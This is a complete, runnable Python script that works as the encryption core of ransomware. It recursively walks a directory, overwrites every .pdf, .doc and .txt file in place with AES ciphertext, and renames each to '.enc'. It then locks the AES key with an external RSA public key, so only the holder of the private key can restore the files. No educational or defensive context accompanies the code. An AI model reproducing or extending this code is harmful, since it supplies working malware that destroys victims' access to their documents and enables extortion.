from os import walk, rename
from os.path import join, exists
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

class Encryptor:
    def __init__(self) -> None:
        # checking if public.pem exists or not
        if not exists("public.pem"):
            print("public.pem not found..")
            exit(1)

        # file types that the code will check for encryption
        self.file_types = ['.pdf', '.doc', '.txt']

        # generating 256 bit AES symmetric key
        self.session_key = get_random_bytes(32)

    # to encrypt AES symmetric key with RSA public key
    def encrypt_session_key(self) -> None:
        # loading public key
        with open("public.pem", "rb") as f:
            public_key = RSA.import_key(f.read())

        # instantiating RSA cipher with public key
        cipher_rsa = PKCS1_OAEP.new(public_key)
        # encrypting AES Key with RSA Cipher
        enc_session_key = cipher_rsa.encrypt(self.session_key)

        # writing encrypted key to file
        with open("encrypted_session_key", "wb") as f:
            f.write(enc_session_key)

    # to encrypt a file
    def encrypt_file(self, file: str) -> None:
        # reading binary of file that is be encrypted
        with open(file, "rb") as f:
            data = f.read()
            
        # instantiating AES cipher
        cipher_aes = AES.new(self.session_key, AES.MODE_EAX)
        # encrypting data and calculating hash
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)

        # storing nonce (almost similar to IV but specific for combination message/key), hash, and encrypted binary
        try:
            with open(file, "wb") as f:
                f.write(cipher_aes.nonce) # 16 bytes
                f.write(tag) # 16 bytes
                f.write(ciphertext) 
            rename(file, file + ".enc") # renaming file (to avoid re-encryption)
            print(file, "encrypted")
        except:
            print(file, "not encrypted")

    # to encrypt certain type of files in a directory
    def encrypt_files(self, directory: str):
        # finding all the files in the directory recursively
        system = walk(directory, topdown=True)
        for root, dir, files in system:
            for file in files:
                if ".enc" not in file: # if file is not encrypted
                    for file_type in self.file_types: 
                        if file_type in file: # if file is of a certain type that should be encrypted
                            file_path = join(root, file)
                            self.encrypt_file(file_path)
                            break


enc = Encryptor()
enc.encrypt_files("mydirectory")
enc.encrypt_session_key()
